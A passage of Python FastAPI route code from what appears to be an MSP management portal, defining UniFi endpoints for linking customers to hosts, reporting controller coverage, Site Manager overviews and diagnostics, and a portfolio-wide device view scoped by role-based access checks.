    from app.core.customer import CustomerManager
    from app.core.rbac import check_customer_access

    pairs = body.matches or []
    if not pairs:
        raise refusal(ValidationError, "err_unifi_no_links")

    applied, skipped = [], []
    for pair in pairs:
        cust_id = (pair.customer_id or "").strip()
        host_id = (pair.host_id or "").strip()
        if not cust_id or not host_id:
            skipped.append(
                {"customer_id": cust_id, **keyed("reason", "err_unifi_link_missing_id", request)}
            )
            continue
        # check_customer_access returns a bool rather than raising, so the
        # result has to be acted on. A request naming a customer the caller
        # may not touch fails whole rather than skipping quietly — a silent
        # skip would read as "applied" to anyone glancing at the response.
        if not await check_customer_access(user, cust_id):
            raise refusal(ForbiddenError, "err_customer_no_access_id", customer=cust_id)

        config = CustomerManager.get_customer(cust_id)
        if not config:
            skipped.append(
                {"customer_id": cust_id, **keyed("reason", "err_link_unknown_customer", request)}
            )
            continue
        config["UniFiHostId"] = host_id
        CustomerManager.save_customer({k: v for k, v in config.items() if not k.startswith("_")})
        applied.append({"customer_id": cust_id, "host_id": host_id})

    return {"ok": True, "applied": applied, "skipped": skipped}


# ── Controller coverage across the portfolio ─────────────────────────────────


@router.get("/unifi/controller-coverage")
async def unifi_controller_coverage(user: User = Depends(get_current_user)):
    """Which customers have a reachable controller, and what each one is missing.

    The cloud key stops at counts — per-site clients, firewall zones and ACLs
    all need a controller login stored against the customer. That storage has
    always existed; what did not was a way to see where it is absent, since
    has_credentials was only ever reported for the active customer.

    Filtered to the customers this user may see, so the answer is scoped to
    their own portfolio rather than the whole tenant.
    """
    from app.core.credentials import get_secret
    from app.core.customer import CustomerManager
    from app.core.rbac import filter_customers, get_accessible_customer_ids
    from app.services.unifi_api import (
        classify_controller_access,
        summarise_controller_coverage,
    )

    allowed = await get_accessible_customer_ids(user)
    customers = filter_customers(CustomerManager.list_customers(), allowed)

    rows = []
    for cust in customers:
        cid = cust.get("_id", "")
        state, reason = classify_controller_access(cust, bool(get_secret(cid, "unifi_username")))
        rows.append(
            {
                "customer_id": cid,
                "name": cust.get("CustomerName", cid),
                "state": state,
                "reason": reason,
                "host": (cust.get("UniFiHost") or "").strip(),
                "site": cust.get("UniFiSite", "default"),
            }
        )

    rows.sort(
        key=lambda r: (
            # Fixable gaps first: a stored address with no login is one form away
            # from working, and is the only state a credential would change.
            0 if r["state"] == "host_only" else 1,
            r["name"].lower(),
        )
    )
    return summarise_controller_coverage(rows)


# ── Site Manager: site overview ──────────────────────────────────────────────


@router.get("/unifi/sm/sites-overview")
async def unifi_sm_sites_overview(
    user: User = Depends(get_current_user),
):
    """Per-site device and client counts, WAN health and gateway IPS posture.

    One upstream call. /v1/sites already carries all of this; the panel was
    assembling a thinner version of it from other endpoints.
    """
    from app.services.unifi_api import get_site_overview

    await _require_unrestricted(user)
    result = await get_site_overview()
    if not result.get("ok"):
        raise (
            ValidationError(result["error"])
            if result.get("error")
            else refusal(ValidationError, "err_unifi_site_overview_failed")
        )
    return result


# ── Site Manager: API diagnostics ────────────────────────────────────────────


@router.get("/unifi/sm/diagnostics")
async def unifi_sm_diagnostics(
    _admin: User = Depends(require_role(Role.admin)),
):
    """Report which Site Manager endpoints answer, and the shape they return.

    Admin-only. The response carries key paths, value types and counts — never
    field values, and never the API key. It exists because the vendor
    documentation is client-rendered and unreadable by a fetch, so the only
    reliable source for the response shape is the live API. Parsing this API
    against an assumed shape is what produced a panel of zeros.
    """
    from app.services.unifi_api import probe_site_manager_api

    result = await probe_site_manager_api()
    if not result.get("ok"):
        raise (
            ValidationError(result["error"])
            if result.get("error")
            else refusal(ValidationError, "err_unifi_diagnostics_unavailable")
        )
    return result


# ── Site Manager: WAN details per site ───────────────────────────────────────


@router.get("/unifi/sm/site/{site_id}/wan")
async def unifi_sm_site_wan(
    site_id: str,
    user: User = Depends(get_current_user),
):
    """Get WAN/ISP details and gateway info for a specific site."""
    from app.services.unifi_api import get_site_wan_details

    await _require_unrestricted(user)
    result = await get_site_wan_details(site_id)
    if not result.get("ok"):
        raise (
            ValidationError(result["error"])
            if result.get("error")
            else refusal(ValidationError, "err_unifi_wan_details_failed")
        )
    return result


# ── Unified UniFi view (all customers) ──────────────────────────────────────


@router.get("/unifi/all")
async def unifi_all(request: Request, user: User = Depends(get_current_user)):
    """Get UniFi device status for ALL customers that have UniFi configured."""
    from app.core.customer import CustomerManager
    from app.core.rbac import filter_customers, get_accessible_customer_ids

    allowed = await get_accessible_customer_ids(user)
    customers = filter_customers(CustomerManager.list_customers(), allowed)

    unifi_customers = []
    for c in customers:
        if c.get("UniFiHost"):
            unifi_customers.append(
                {
                    "customer_id": c.get("_id", ""),
                    "customer_name": c.get("CustomerName", ""),
                    "host": c.get("UniFiHost", ""),
                    "mode": c.get("UniFiMode", "controller"),
                }
            )

    # Get cached device data from dashboard poller
    try:
        from app.services.dashboard_poller import poller as _poller
    except ImportError:
        _poller = None
    all_devices = []
    if _poller:
        for dev in _poller.get_devices():
            if dev.get("vendor") == "unifi":
                # Scope to the caller: the poller cache holds every customer's
                # devices, and the customer-name lookup below only blanks the
                # name — without this guard a viewer assigned to one customer
                # still received every customer's UniFi gear (firmware, serial,
                # WAN IP). Mirrors /dashboard/devices and dashboard_infra.
                if allowed is not None and dev.get("customer_id") not in allowed:
                    continue
                # Find customer name
                cust_name = ""
                for uc in unifi_customers:
                    if uc["customer_id"] == dev.get("customer_id"):
                        cust_name = uc["customer_name"]
                        break
                dev["customer_name"] = cust_name
                all_devices.append(dev)

    # If no per-customer UniFi config but global Site Manager API key is set,
    # fetch sites from cloud API so the UniFi tab isn't empty.
    # v1 API allows 10,000 req/min — no caching needed.
    # Only for unrestricted callers: the global key lists every console in the
    # MSP's account, and an empty scoped view is what triggers the fallback.
    sm_sites = []
    if allowed is None and not unifi_customers and not all_devices:
        from app.core.config import load_app_settings

        api_key = load_app_settings().get("unifi_site_manager_api_key", "")
        if api_key:
            try:
                from app.services.unifi_api import site_manager_list_sites

                sm_result = await site_manager_list_sites(token=api_key)
                if sm_result.get("ok"):
                    sm_sites = sm_result.get("sites", [])
            except Exception as e:
                logger.warning("Site Manager fetch for /unifi/all failed: %s", e)

            for host in sm_sites:
                # Host/console entry — full detail for the detail panel
                entry = {k: v for k, v in host.items()}
                entry["ip"] = entry.pop("wan_ip", "")
                entry["clients"] = entry.pop("client_count", 0)
                entry["vendor"] = "unifi"
                entry["customer_name"] = ""
                entry["source"] = "site_manager"
                entry["entry_type"] = "host"
                all_devices.append(entry)

    online = sum(1 for d in all_devices if d.get("status") == "online")
    total_clients = sum(d.get("clients", 0) or 0 for d in all_devices)
    total_sub_devices = sum(d.get("device_count", 0) or 0 for d in all_devices)

    return {
        "devices": all_devices,
        "customers": unifi_customers,
        "summary": {
            "total_devices": total_sub_devices or len(all_devices),
            "online": online,
            "offline": len(all_devices) - online,
            "total_clients": total_clients,
            "configured_customers": len(unifi_customers) or len(sm_sites),
        },
    }
